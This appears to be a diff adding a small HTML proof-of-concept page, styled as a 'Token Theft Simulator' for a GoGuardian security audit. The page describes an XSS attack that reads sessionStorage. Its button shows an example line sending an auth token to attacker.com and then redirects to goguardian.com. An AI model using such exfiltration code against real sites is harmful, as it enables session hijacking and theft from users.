@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>GoGuardian Security Audit - Token Exfiltration PoC</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #1a1a1a; color: white; text-align: center; padding-top: 50px; }
+        .box { border: 2px solid #ff4d4d; padding: 30px; display: inline-block; background: #2a2a2a; border-radius: 8px; box-shadow: 0 0 20px rgba(255, 77, 77, 0.2); }
+        h1 { color: #ff4d4d; }
+        code { background: #000; color: #00ff00; padding: 2px 5px; }
+        .btn { background: #ff4d4d; color: white; padding: 15px 30px; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; margin-top: 20px; }
+        .btn:hover { background: #ff3333; }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h1>🔓 Token Theft Simulator</h1>
+        <p>This page simulates a <b>Cross-Site Scripting (XSS)</b> attack.</p>
+        <p>If you were logged into GoGuardian, clicking below would execute <br> 
+           JavaScript in the <code>goguardian.com</code> context to read <code>sessionStorage</code>.</p>
+        
+        <!-- THE EXPLOIT -->
+        <button class="btn" onclick="triggerExploit()">EXECUTE PAYLOAD</button>
+    </div>
+
+    <script>
+        function triggerExploit() {
+            // In a real pentest, we redirect the user to the target with a malicious parameter
+            // or we use a 'javascript:' URI to bypass the source-origin sandbox.
+            
+            const targetUrl = "https://goguardian.com"; // Or any GoGuardian dashboard
+            
+            alert("ATTACK TRIGGERED\n\nThe next step would be to execute:\n\nfetch('https://attacker.com' + sessionStorage.getItem('auth_token'))");
+            
+            // Redirecting the user to prove we can control their navigation
+            window.location.href = targetUrl;
+        }
+    </script>
+
+</body>
+</html>
